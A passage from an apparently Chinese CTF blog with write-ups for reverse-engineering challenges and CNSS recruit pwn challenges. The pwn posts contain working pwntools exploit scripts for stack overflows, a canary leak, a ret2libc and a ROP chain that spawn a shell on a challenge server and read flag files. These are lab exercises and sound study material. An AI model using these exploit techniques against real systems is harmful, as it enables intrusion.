i-- - 11; &#125;LABEL_4: if ( i != 9 ) break; putchar(byte_601680[v13 * v13 + 7]); v13 = v13 * v13 + 1; i = 10; &#125; &#125; while ( i != 13 ); putchar(byte_601680[2 * v13 + 12]); v8 = 3; v12 = 3 * v13; &#125; putchar(byte_601680[3 * v12 + 1]); v0 = v12 * v12; putchar(byte_601680[v0 - 15]); v11 = v0 - 15; v7 = 4; putchar(byte_601680[4]);LABEL_21: if ( v7 != 4 ) break; putchar(byte_601680[v11 + 6]); v12 = v11 - 3; v8 = 3; &#125; &#125; while ( v7 != 8 ); putchar(byte_601680[2 * v11 + 32]); &#125; …有点烦，还是先学习下gdb吧。 学习后发现用ida远程调试就可以了，并不一定要用gdb，调试时把所有跳转到失败情况的jle之类的nop掉，这样运行到最后就会输出flag了。 分道扬镳题目说是一个迷宫，ida打开，用字符串查看地图： 12345678********* * ** * ** ** * ** ** * #* ** **** ** ********* 找到调用这个地图的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182 v5 = 0; memset(&amp;v6, 0, 0x74u); v7 = 0; v8 = 0; strcpy(&amp;v2, &quot;********* * ** * ** ** * ** ** * #* ** **** ** *********&quot;); v1 = &amp;v3; printf(&quot;Please input your key:\\n&quot;); gets(&amp;v5); if ( strlen(&amp;v5) != 22 ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(1); &#125; v11 = 0; do &#123; v10 = *(&amp;v5 + v11); if ( v10 != &apos;k&apos; &amp;&amp; v10 != &apos;j&apos; &amp;&amp; v10 != &apos;h&apos; &amp;&amp; v10 != &apos;l&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(2); &#125; v9 = *(&amp;v5 + v11); switch ( v9 ) &#123; case &apos;h&apos;: if ( --v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || (result = (char *)*v1, result == (char *)&apos;*&apos;) ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(3); &#125; if ( *v1 == &apos;#&apos; ) &#123;LABEL_41: printf(&quot;Good!\\n&quot;); system(&quot;pause&quot;); exit(0); &#125; break; case &apos;j&apos;: v1 += 8; if ( v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(3); &#125; result = (char *)*v1; if ( result == (char *)&apos;#&apos; ) goto LABEL_41; break; case &apos;k&apos;: v1 -= 8; if ( v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(3); &#125; result = v1; if ( *v1 == &apos;#&apos; ) goto LABEL_41; break; default: if ( ++v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(4); &#125; result = v1; if ( *v1 == &apos;#&apos; ) goto LABEL_41; break; &#125; ++v11; &#125; while ( v11 &lt; 25 ); return result; 分析得j是向下，k是向上，h向左，l向右，不能走到*上，走到#就走出了迷宫，结合地图得到答案。 10000000ida打开，main函数： 12345678910111213141516171819202122232425262728__main();v17 = 0;memset(&amp;v18, 0, 0x10u);memset(&amp;v4, 0, 0x14u);v4 = -26;v5 = -20;v6 = -31;v7 = -25;v8 = -70;v9 = -12;v10 = -27;v11 = -13;v12 = -12;v13 = -12;v14 = -27;v15 = -13;v16 = -12;v19 = 0;puts(asc_403024);scanf(&quot;%s&quot;, &amp;v17);LOBYTE(v19) = 0;while ( *((_BYTE *)&amp;v17 + v19) ) *((_BYTE *)&amp;v17 + v19++) |= 0x80u;if ( !strcmp((const char *)&amp;v17, &amp;v4) ) printf(&quot;good&quot;);else printf(&quot;wrong&quot;);return 0; 逻辑很简单，输入|=0x80后与v4相等就ok了，不过不清楚|可不可以逆运算，来一发爆破吧： 12345678import stringv4=[0xe6,0xec,0xe1,0xe7,0xba,0xf4,0xe5,0xf3,0xf4,0xf4,0xe5,0xf3,0xf4]flag=&quot;&quot;for i in range(len(v4)): for j in string.printable: if ord(j)|0x80==v4[i]: flag+=jprint flag 需要注意的是ida打开时v4的值默认显示的是十进制负数……如果用这个来爆破是不会得到结果的，转换成十六进制后变成正数（鶸也不知道为啥），随后就可以得到flag了。","categories":[],"tags":[]},{"title":"实验吧-1","slug":"实验吧-1","date":"2018-10-22T14:37:21.000Z","updated":"2018-10-22T14:37:34.637Z","comments":true,"path":"2018/10/22/实验吧-1/","link":"","permalink":"http://yoursite.com/2018/10/22/实验吧-1/","excerpt":"","text":"证明自己吧ida打开，定位到关键函数： 1234567891011121314151617181920212223242526272829303132 v5 = dword_40708C; v6 = dword_407090; v8 = word_407098; v9 = byte_40709A; v7 = dword_407094; if ( strlen(a1) == strlen((const char *)&amp;v5) ) &#123; v1 = 0; if ( strlen(a1) != 0 ) &#123; do a1[v1++] ^= 0x20u; while ( v1 &lt; strlen(a1) ); &#125; v2 = 0; if ( strlen((const char *)&amp;v5) != 0 ) &#123; do *((_BYTE *)&amp;v5 + v2++) -= 5; while ( v2 &lt; strlen((const char *)&amp;v5) ); &#125; v3 = 0; if ( strlen((const char *)&amp;v5) == 0 ) return 1; while ( *((_BYTE *)&amp;v5 + v3 + a1 - (const char *)&amp;v5) == *((_BYTE *)&amp;v5 + v3) ) &#123; if ( ++v3 &gt;= strlen((const char *)&amp;v5) ) return 1; &#125; &#125; return 0;&#125; 可知flag的长度和v5相等，flag每位与0x20异或，v5每位减5之后，flag[i]=v5[i]。 逆运算脚本如下： 12345678v5=[0x68,0x57,0x19,0x48,0x50,0x6e,0x58,0x78,0x54,0x6a,0x19,0x58,0x5e,6]temp=[]for i in v5: i-=5 i^=0x20 key.append(i)flag=&apos;&apos;.join([chr(i) for i in temp])print flag NSCTF Reverse 500pyc文件直接在线反编译一波： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394data = &quot;M,\\x1d-\\x18&#125;E&apos;\\x1ezN~\\x1b*\\x19+\\x12%\\x1d-&quot; + &apos;I\\x7fM(I&#123;I\\x7fJ.\\x16wWcRj\\x0e6\\x0fn&apos; + &apos;Zo\\nn\\x0fk\\t1R7\\x03g\\x067\\x00eUb\\x043&apos; + &apos;\\x014\\x071Rr\\x14x\\x19~D?q&quot;a5s,A%&apos; + &quot;\\x10&apos;\\x11uLyA%\\x1d|DrFv\\x12t\\x11#B&amp;&quot; + &apos;GsKzK*O)\\x1c%GuC&gt;\\x1e\\x7f\\x1b+\\x19*&apos; + &apos;\\x1e&amp;\\x14-\\x1f/\\x1axAqBq@yO-LtE&#125;&apos; + &apos;\\x1b,MuBp\\x12&apos;import osimport sysimport structimport cStringIOimport stringimport disimport marshalimport typesimport randomcount = 0def reverse(string): return string[::-1]data_list = list(reverse(data)[1:])def decrpyt(c, key2): global count data_list[count] = c ^ key2 count += 1def GetFlag1(): key = struct.unpack(&apos;B&apos;, data[len(data) - 8])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 3])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-1]: print chr(c), def GetFlag2(): key = struct.unpack(&apos;B&apos;, data[len(data) - 11])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 4 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-1]: print chr(c), def GetFlag3(): key = struct.unpack(&apos;B&apos;, data[len(data) - 5])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 2 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-1]: print chr(c), def GetFlag4(): global count key = struct.unpack(&apos;B&apos;, data[len(data) - 1])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 1 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) count = 0 for c in data_list[::-1]: print chr(c), def GetFlag5(): key = struct.unpack(&apos;B&apos;, data[len(data) - 9])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 3 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-12]: print chr(c), GetFlag1() 直接运行一波，发现会对data进行报错，百度后发现时在反编译时，例如0f aa这样的指令时会变成\\xfa\\xa*这样，就会导致错位⽽而解不出flag。 这时可以用winhex打开pyc文件，找到data，然后自己进行转换就行了，data用十六进制表示为： 14D2C1D2D 187D4527 1E7A4E7E 1B2A192B 12251D2D 73140000 00497F4D 28497B49 7F4A2E16 77576352 6A0E360F 6E731400 00005A6F 0A6E0F6B 09315237 03670637 00655562 04337314 00000001 34073152 72147819 7E443F71 22613573 2C412573 14000000 10271175 4C794125 1D7C4472 46761274 11234226 73140000 0047734B 7A4B2A4F 291C2547 75433E1E 7F1B2B19 2A731400 00001E26 142D1F2F 1A784171 42714079 4F2D4C74 457D7307 0000001B 2C4D7542 7012 然而运行后得不到flag，不过这里定义了5个getflag函数，一个个尝试后在getflag4时找到了flag。 NSCTF Reverse 400py2exe的逆向，参考PyInstaller Extractor安装和使用方法 在reverse03里找到了一些代码： 12345678910111213141516171819202122data=\\&quot;\\x1c\\x7a\\x16\\x77\\x10\\x2a\\x51\\x1f\\x4c\\x0f\\x5b\\x1d\\x42\\x2f\\x4b\\x7e\\x4a\\x7a\\x4a\\x7b&quot;+\\&quot;\\x49\\x7f\\x4a\\x7f\\x1e\\x78\\x4c\\x75\\x10\\x28\\x18\\x2b\\x48\\x7e\\x46\\x23\\x12\\x24\\x11\\x72&quot;+\\&quot;\\x4b\\x2e\\x1b\\x7e\\x4f\\x2b\\x12\\x76\\x0b&quot;&apos;&apos;&apos;char buf[] = &quot;flag:&#123;NSCTF_md5098f6bcd4621d373cade4e832627b4f6&#125;&quot;;int _tmain(int argc, _TCHAR* argv[])&#123; printf(&quot;%d\\n&quot;, strlen(buf)); char key = &apos;\\x0b&apos;; buf[47] ^= key; for (int i = 1; i &lt; 48; i++) &#123; buf[48 - i - 1] ^= buf[48 - i]; &#125; return 0;&#125;&apos;&apos;&apos;print &quot;Revese it?????????&quot; 直接就给出了flag，然而并不正确，看来给了一段c的代码是要用到的。 后发现对data进行如c代码的运算后就可以得到flag，逆运算脚本： 12345678data=&quot;\\x1c\\x7a\\x16\\x77\\x10\\x2a\\x51\\x1f\\x4c\\x0f\\x5b\\x1d\\x42\\x2f\\x4b\\x7e\\x4a\\x7a\\x4a\\x7b&quot;+&quot;\\x49\\x7f\\x4a\\x7f\\x1e\\x78\\x4c\\x75\\x10\\x28\\x18\\x2b\\x48\\x7e\\x46\\x23\\x12\\x24\\x11\\x72&quot;+&quot;\\x4b\\x2e\\x1b\\x7e\\x4f\\x2b\\x12\\x76\\x0b&quot;temp=list(data)for i in range(0,len(temp)-2): temp[i]=chr(ord(temp[i])^ord(temp[i+1]))temp[47]=chr(ord(temp[47])^0x0b)flag=&apos;&apos;.join(i for i in temp)print flag bin100(ebCTF 2013)一个掷🎲小游戏，掷出需要的数字就能得到flag。 用od打开，字符串搜索，定位到： 120040192B /75 5E jnz short Dice.0040198B0040192D . |C74424 04 1F4&gt;mov dword ptr ss:[esp+0x4],Dice.0044421F ; [*] You rolled a three! Good! 可见这里就是判断掷出的🎲是不是需要的数字，如果不是的话，jnz就会使得进程跳到失败，所以把jnz这一句nop掉就可以跳过判断，使程序认为掷出了需要的数字，后面还有四个一样的地方，也nop掉之后f9运行程序，回车掷完🎲之后，f8往下运行就可以得到flag。 该题不简单一开始没仔细看题目，以为成功登陆就可以得到flag…后来发现是要找到对应用户名hello的注册码，还是用ida打开看看吧。 文本搜索一下无效，找到了关键函数： 12345678910111213141516171819202122232425262728String[0] = 0;memset(&amp;String[1], 0, 0x1Cu);v3 = 0;v4 = 0;String1 = 0;memset(&amp;v10, 0, 0x1Cu);v11 = 0;v12 = 0;String2 = 0;memset(&amp;v6, 0, 0x1Cu);v7 = 0;v8 = 0;if ( GetDlgItemTextA(hDlg, 1000, String, 16) &lt; 5 ) return 1;GetDlgItemTextA(hDlg, 1001, &amp;String1, 16);v1 = 0;if ( strlen(String) != 0 )&#123; do &#123; *(&amp;String2 + v1) = (v1 + v1 * String[v1] * String[v1]) % 0x42 + 33; ++v1; &#125; while ( v1 &lt; strlen(String) );&#125;strcpy(String, &quot;Happy@&quot;);lstrcatA(String, &amp;String2);return lstrcmpA(&amp;String1, String) != 0; 如果这个函数返回1的话就是注册码正确了。输入用户名后，注册码[i]=i+i*用户名[i]*用户名[i]%0x42+33，再在前面加上Happy@就得到注册码了。 脚本如下： 12345username=&quot;hello&quot;string2=&quot;&quot;for i in range(len(username)): string2+=chr(i+i*ord(username[i])*ord(username[i])%0x42 +33)print &quot;Happy@&quot;+string2 这样的明文密码用od调试应该会更快一点，可以直接看到注册码是什么。","categories":[],"tags":[]},{"title":"geek-no-gdb","slug":"geek-no-gdb","date":"2018-10-19T08:01:32.000Z","updated":"2018-10-19T08:19:30.535Z","comments":true,"path":"2018/10/19/geek-no-gdb/","link":"","permalink":"http://yoursite.com/2018/10/19/geek-no-gdb/","excerpt":"","text":"题目地址 话说好像是要用gdb调试的，然而之前一直没用过gdb，对着教程弄了一会，也许是因为编译时没有-g导致调试不起来，只能拖进ida看看，发现大部分函数也是能看的，不过最关键的一段函数却无法使用f5，只能怼汇编了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970sub_400716 proc near ; CODE XREF: main+B0↓ps = qword ptr -68hvar_54 = dword ptr -54hs2 = byte ptr -50hvar_48 = qword ptr -48hvar_40 = qword ptr -40hvar_38 = qword ptr -38hvar_30 = qword ptr -30hvar_28 = word ptr -28hvar_18 = qword ptr -18h; __unwind &#123; push rbp mov rbp, rsp nop sub rsp, 68h mov [rbp+s], rdi mov rax, fs:28h mov [rbp+var_18], rax xor eax, eax mov rax, &apos;kVPSOwmg&apos; mov qword ptr [rbp+s2], rax mov rax, &apos;YkQ\\@kQV&apos; mov [rbp+var_48], rax mov rax, &apos;QC[Dk@G[&apos; mov [rbp+var_40], rax mov rax, &apos;kg&#123;kXARF&apos; mov [rbp+var_38], rax mov rax, &apos;FQSSAVQP&apos; mov [rbp+var_30], rax mov [rbp+var_28], &apos;I&apos; mov [rbp+var_54], 0 jmp short loc_4007A3; ---------------------------------------------------------------------------loc_400787: ; CODE XREF: sub_400716+A2↓j mov eax, [rbp+var_54] cdqe movzx eax, [rbp+rax+s2] xor eax, 34h mov edx, eax mov eax, [rbp+var_54] cdqe mov [rbp+rax+s2], dl add [rbp+var_54], 1loc_4007A3: ; CODE XREF: sub_400716+6F↑j mov eax, [rbp+var_54] movsxd rbx, eax mov rax, [rbp+s] mov rdi, rax ; s call _strlen cmp rbx, rax jb short loc_400787 lea rdx, [rbp+s2] mov rax, [rbp+s] mov rsi, rdx ; s2 mov rdi, rax ; s1 call _strcmp test eax, eax jnz short loc_4007DD mov edi, offset s ; &quot;Yeah!Prison break!&quot; call _puts jmp short loc_4007E7; ---------------------------------------------------------------------------loc_4007DD: ; CODE XREF: sub_400716+B9↑j mov edi, offset aNoYouFailed ; &quot;No!You Failed&quot; call _puts 一通操作就是把一开始的输入读入s，然后再把一个字符串读入s2，如果对于s的每一位异或0x34后与s2相等就ok啦，所以flag=s2^0x34，逆运算脚本如下： 123s2=&quot;gmwOSPVkVQk@\\QkY[G@kD[CQFRAXk&#123;gkPQVASSQFI&quot;flag=&apos;&apos;.join([chr(ord(i)^0x34) for i in s2])print flag 不知道怎么用gdb真是鶸啊orz","categories":[],"tags":[]},{"title":"CNSSrecruit-3","slug":"CNSSrecruit-3","date":"2018-10-15T15:05:31.000Z","updated":"2018-10-20T10:57:54.205Z","comments":true,"path":"2018/10/15/CNSSrecruit-3/","link":"","permalink":"http://yoursite.com/2018/10/15/CNSSrecruit-3/","excerpt":"","text":"GuessPigeon3开了canary保护，提供了libc.so文件。参考文章write函数泄露+用地址跳回重执行主函数 guess函数： 123456789101112131415unsigned int guess()&#123; char buf; // [esp+8h] [ebp-70h] unsigned int v2; // [esp+6Ch] [ebp-Ch] v2 = __readgsdword(0x14u); memset(&amp;buf, 0, 0x64u); puts(&quot;You You have two chances. Please input your guess:&quot;); read(0, &amp;buf, 0x100u); printf(&quot;You guessed the pigeon number is %s .\\nI&apos;m sorry, you guessed wrong.&quot;, &amp;buf); puts(&quot;Please input your guess again:&quot;); read(0, &amp;buf, 0x100u); puts(&quot;You&apos;ve been fooled.There are no pigenos here!\\n Good bye~&quot;); return __readgsdword(0x14u) ^ v2;&#125; v2就是canary，buf存在栈溢出。 ida打开libc.so.6，找到system的偏移地址。/bin/sh字符串的偏移地址可以用winhex打开libc文件查找（详见参考文章，很给力）。 第一次输入后会对输入进行一次输出，可以利用这一次输出把canary带出来，在第二次输入中使用来跳过canary保护。 然后第二次输入时利用栈溢出覆盖掉guess函数的返回地址，调用write函数，输出write函数的真实地址来计算libc的起始地址，就可以计算出system函数的真实地址。同时将write函数的返回地址填充为main函数的地址，这样在第二次输入完之后又会再次进入main函数。 这样再次进入main函数之后，就可以开shell了。脚本如下： 12345678910111213141516171819202122232425262728293031from pwn import *elf1=ELF(&quot;./GuessPigeon3&quot;)elf2=ELF(&quot;./libc.so.6&quot;)plt_write=elf1.plt[&quot;write&quot;]got_write=elf1.got[&quot;write&quot;]system_libc=0x3ada0bin_sh_libc=0x15ba0bsh=remote(&quot;132.232.34.26&quot;,8888)sh.recvuntil(&quot;token:&quot;)sh.sendline(&quot;GuessPigeon3&quot;)sh.recvuntil(&quot;guess:&quot;)sh.sendline(&apos;a&apos;*95+&quot;abcde&quot;)sh.recvuntil(&quot;abcde&quot;)sh.recv(1)canary=&apos;\\x00&apos;+sh.recv(3)sh.recvuntil(&quot;again:&quot;)payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(plt_write)+p32(0x080486c4)+p32(1)+p32(got_write)+p32(4)sh.sendline(payload)sh.recvuntil(&apos;bye~\\n&apos;)leak=u32(sh.recv(4))libc_base=leak-elf2.symbols[&apos;write&apos;]system=libc_base+system_libcbin_sh=libc_base+bin_sh_libcsh.recvuntil(&quot;guess:&quot;)sh.sendline(&apos;1&apos;)sh.recvuntil(&quot;again:&quot;)payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(system)+p32(1)+p32(bin_sh)sh.sendline(payload)sh.recv()sh.interactive() 发现程序十秒不输入就会自行结束，所以把cat flag的操作也写进脚本吧。 123sh.sendline(&quot;cd ..&quot;)sh.sendline(&quot;cat flag_GuessPigeon3&quot;)sh.recv() 诡异的修罗铭文","categories":[],"tags":[]},{"title":"CNSSrecruit-2","slug":"CNSSrecruit-2","date":"2018-10-14T14:32:19.000Z","updated":"2018-10-15T13:57:51.975Z","comments":true,"path":"2018/10/14/CNSSrecruit-2/","link":"","permalink":"http://yoursite.com/2018/10/14/CNSSrecruit-2/","excerpt":"","text":"childNc主函数如下： 123456789101112131415161718v8 = __readfsqword(0x28u);setvbuf(stdin, 0LL, 2, 0LL);setvbuf(stdout, 0LL, 2, 0LL);setvbuf(stderr, 0LL, 2, 0LL);puts(&quot;Please input two right numbers:&quot;);__isoc99_scanf(&quot;%d %d&quot;, &amp;v4, &amp;v5);v6 = v4 + v5;v7 = v4 - v5;if ( v4 + v5 != 19 || v7 != 5 )&#123; puts(&quot;Try again~&quot;);&#125;else&#123; puts(&quot;Gooood!you get shell!Can you find the flag?\\n&quot;); system(&quot;/bin/sh&quot;);&#125;return 0; 可以发现输入12和7就可以获得shell，然而ls并没有发现flag文件，原来是隐藏了起来，用ls -f查看隐藏文件，在..里找到flag。 12345678910ls -fstartpwn.sh.startdocker.sh..childNccd ..lsbinflag_childNc GuessPigeon程序自带getshell函数，所以只要找一个栈溢出然后把返回地址修改成getshell的地址就ok了，脚本如下 一开始没看一下有没有开什么保护啥的，结果试了半天也没能成功……后来发现开了canary保护，现场百度一波，找到了大佬的教程Linux pwn入门教程(9)——stack canary与绕过的思路，不过研究了一晚上发现这一题并不需要用到这篇教程里的东西….. 主程序如下： 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax int v4; // ST1C_4 init(); puts(&quot;Welcome to CNSS Recruit 2018\\n&quot;); puts(&quot;Let&apos;s guess the pigeon number together!&quot;); v3 = time(0); srand(v3); v4 = rand(); guess(v4); return 0;&#125; v3就是canary的值，guess函数如下： 123456789101112131415161718unsigned int __cdecl guess(int a1)&#123; char nptr; // [esp+8h] [ebp-70h] unsigned int v3; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword(0x14u); puts(&quot;Please input your guess:&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;nptr); if ( atoi(&amp;nptr) == a1 ) &#123; puts(&quot;My Gooood!You guessed the pigeon number!!&quot;); getshell(); &#125; else &#123; printf(&quot;You are wrong!The pigeon&apos;s number is %d\\n try again~&quot;, a1); &#125; return __readgsdword(0x14u) ^ v3; 栈中各变量的分布顺序： 123nptrcanarya1 这里可以通过scanf的栈溢出来修改a1，也就是v4的值。atoi()函数是将字符串转化为整形，例如’0’就会被转换成0，所以scanf输入时我选择全部用’0’填充，到了a1的值时使用p32(0)把a1修改为0，这样就使得guess函数中的判断成立，在函数结束之前进入了shell，无所谓是不是触发canary保护了。 脚本如下： 123456789from pwn import *elf=ELF(&quot;2&quot;)sh=remote(&quot;132.232.34.26&quot;,8888)print sh.recvuntil(&apos;token:&apos;)sh.sendline(&apos;GuessPigeon&apos;)print sh.recvuntil(&apos;guess:&apos;)payload=&apos;0&apos;*0x78+p32(0)sh.sendline(payload)sh.interactive() flag文件依旧是隐藏在..文件夹中，不过既然题目是在同一个平台，前面提示了后面也就不会很懵逼了。 GuessPigeon2本题参考了i春秋上面大佬的教程Linux pwn入门教程(3)——ROP技术 主函数： 123456789101112int result; // eaxchar buf; // [rsp+0h] [rbp-70h]puts(&quot;Please input your guess:&quot;);__isoc99_scanf((__int64)&quot;%s&quot;, (__int64)&amp;buf);puts(&quot;You&apos;ve been fooled.There are no pigenos here!\\n Good bye~&quot;);puts(&quot;Do you want to get hint? yes/no?&quot;);read(0, &amp;buf, 0x100uLL);result = strcmp(&amp;buf, &quot;yes&quot;);if ( !result ) result = printf(&quot;Do you know \\&quot;%s\\&quot;\\n&quot;, s);return result; 函数列表里有system函数，只是参数不是/bin/sh。buf存在栈溢出，并且有两次输入都是输入到buf，所以第一次输入随便输入点什么，第二次输入时利用栈溢出调用system函数，并且发现s中储存的字符串正好是/bin/sh，可以用来作为system函数的参数。但是这个和之前做的那题有system函数没参数的不一样，这题是64位的，那题是32位的。 “在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样），因此，我们就需要一个给RDI赋值的办法。由于我们可以控制栈，根据ROP的思想，我们需要找到的就是pop rdi; ret，前半段用于赋值rdi，后半段用于跳到其他代码片段。” 所以我们需要找一个命令pop rdi,这里可以使用ROPgadget ROPgadget --binary 1 | grep &quot;pop rdi&quot; 这里找到的地址是0x400933,同时在ida中查看到call system的地址是0x4007cf,s的地址是0x600e20，利用这些就可以编写payload。 脚本如下： 1234567891011from pwn import *elf=ELF(&quot;1&quot;)sh=remote(&quot;132.232.34.26&quot;,8888)sh.recvuntil(&apos;token:&apos;)sh.sendline(&apos;GuessPigeon2&apos;)sh.recvuntil(&apos;Please input your guess:&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;yes/no?&apos;)payload=&apos;a&apos;*0x78+p64(0x400933)+p64(0x600e20)+p64(0x4007cf)sh.sendline(payload)sh.interactive() 成功进入shell，这题的flag也是藏在了..文件夹里，cd ..之后cat flag。","categories":[],"tags":[]},{"title":"CNSSrecruit-1","slug":"CNSSrecruit-1","date":"2018-10-13T08:28:12.000Z","updated":"2018-10-13T11:51:00.118Z","comments":true,"path":"2018/10/13/CNSSrecruit-1/","link":"","permalink":"http://yoursite.com/2018/10/13/CNSSrecruit-1/","excerpt":"","text":"RE签到题shift+f12查看字符串 2048一个小游戏，得到100w分得到flag，既然能用CE,为什么不用呢XD 海南鸽子关键部分： 12345678910scanf(&quot;%19s&quot;, &amp;v6);sub_401005(&amp;v6, (int)&amp;v2);for ( i = 0; i &lt; strlen(&amp;v2); ++i ) --*(&amp;v2 + i);if ( !strcmp(&amp;v2, &quot;X14yb2sEVk8BXWMkMiQ8&quot;) ) printf(&quot;Success!\\n\\n&quot;);else printf(aWrongFlagO);system(&quot;pause&quot;);return 0; sub401005是base64加密，判断方式为如果输入进行base64加密后，再每一位减去1,若与X14yb2sEVk8BXWMkMiQ8相等则success，逆运算得到flag。 推箱子游戏题目直接提示了关键点： 12345678910111213141516171819202122232425262728293031323334353637383940414243stream = fopen(&quot;./score.data&quot;, &quot;rb+&quot;); if ( stream ) &#123; ptr = 0LL; v6 = 0LL; v0 = 16LL; fread(&amp;ptr, 0x10uLL, 1uLL, stream); fclose(stream); puts(&quot;-----Score Board-----&quot;); LODWORD(v3) = 0; while ( (signed int)v3 &lt;= 3 ) &#123; v0 = (unsigned int)(v3 + 1); printf(&quot;level%d: %d steps\\n&quot;, v0, *((unsigned int *)&amp;ptr + (signed int)v3), v3); LODWORD(v3) = v3 + 1; &#125; if ( ptr == 0x2500000011LL ) &#123; v7 = -8977570383032666059LL; v8 = 4503996766676335161LL; v9 = 51; v10 = 105; v11 = 52; v12 = -122; v13 = 78; v14 = 105; v15 = 102; v16 = 67; v17 = -124; v18 = 108; v19 = 58; v20 = 51; v21 = 75; v22 = -106; v23 = 0; for ( HIDWORD(v3) = 0; SHIDWORD(v3) &lt;= 29; ++HIDWORD(v3) ) &#123; *((_BYTE *)&amp;v7 + SHIDWORD(v3)) -= 48; *((_BYTE *)&amp;v7 + SHIDWORD(v3)) ^= 0x66u; &#125; v0 = (unsigned __int64)&amp;v7; printf(&quot;\\n%s\\n&quot;, &amp;v7, v3); &#125; 这里有两个选择，一是根据ptr==0x2500000011，将score.data中的数据改成1100 0000 2500 0000 0000 0000 0000 0000,然后再打开scoreboard就可以触发条件得到flag，二是直接根据生成flag的函数计算出flag。 源码审计源码define了很多哲学词汇，例如deep♂dark♂fantasy。用sublime搜索全部然后替换掉就看起来很明白了，不过要注意的是，定义变量时也定义了很多带_的变量，不注意的话可能会替换错误，处理后代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;char input[1024] = &#123; 0 &#125;;int aaa(char* b)&#123; int v3 = 0,v2 = 0; char key[] =&#123; 0,0,0,0x21, 0x5, 0x32, 0x43, 0x54, 0x21, 0x8, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1d, 0x32, 0x43, 0x54, 0x21, 0x7, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x55, 0x32, 0x43, 0x54, 0x21, 0x27, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1f, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x30, 0x32, 0x43, 0x54, 0x21, 0xb, 0x32, 0x43, 0x54, 0x21, 0x1b, 0x32, 0x43, 0x54 ,0x65&#125;; int i = 0; int i_ = 0;1: int p__ = key[i ++]; if (p__== 0) goto 1; if (p__== 0x21) goto 2; if (p__== 0x32) goto 3; if (p__== 0x43) goto 4; if (p__== 0x54) goto 5; if (p__== 0x65) goto 6;3: v2 = input[i_ ++]; goto 7;4: v3 = v3^0x66^v2; goto 1;2: v3 = key[i ++]; goto 7;7: goto 1;5: if (v3== 0) goto 1;6: return v3;&#125;int main()&#123; printf(&quot;Please &quot;); printf(&quot;input &quot;); printf(&quot;flag:&quot;); scanf(&quot;%s&quot;, input); if(strlen(input)==15) goto start;start: int p = aaa(input); if (p==0) &#123; printf(&quot;\\no yes\\n&quot;); system(&quot;pause&quot;); return 0; &#125;end: printf(&quot;\\nnonono\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 分析可以发现，根据key中的值，对input进行处理之后如果v3=0的话就可以了。key中0x21,****,0x32,0x43,0x54构成一个循环，操作是使得****处的值异或input中的值再异或0x66等于0，所以input=****^0x66，运算脚本如下： 123key=[0x5,0x8,0x15,0x15,0x1d,0x7,0x39,0x55,0x27,0x15,0x1f,0x39,0x30,0xb,0x1b]flag=&quot;&quot;.join([chr(i^0x66)for i in key])print flag","categories":[],"tags":[]},{"title":"sus-unpackme","slug":"sus-unpackme","date":"2018-10-11T15:20:59.000Z","updated":"2018-10-21T14:18:49.043Z","comments":true,"path":"2018/10/11/sus-unpackme/","link":"","permalink":"http://yoursite.com/2018/10/11/sus-unpackme/","excerpt":"","text":"peid查壳upx壳，尝试手动脱壳。然而对着教程发现，用od载入时我的od载入的一开始并不是push 